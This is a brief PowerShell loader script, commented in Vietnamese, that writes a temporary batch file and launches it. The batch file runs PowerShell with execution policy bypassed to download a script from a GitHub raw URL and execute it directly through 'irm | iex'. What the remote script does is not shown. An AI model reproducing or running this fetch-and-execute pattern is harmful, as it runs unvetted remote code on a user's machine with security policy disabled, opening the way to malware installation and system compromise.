# Loader chính, chạy qua irm | iex, sẽ popup CMD menu
$tmpBat = [System.IO.Path]::GetTempFileName() -replace '\.tmp$', '.bat'
$batContent = @'
@echo off
powershell -NoProfile -ExecutionPolicy Bypass -Command "irm https://raw.githubusercontent.com/ranusTeam41/kinovrise/refs/heads/main/obsmcKinovRise_Version6.ps1 | iex"
pause
'@
Set-Content -Encoding ASCII $tmpBat $batContent
Start-Process cmd.exe -ArgumentList "/c `"$tmpBat`""
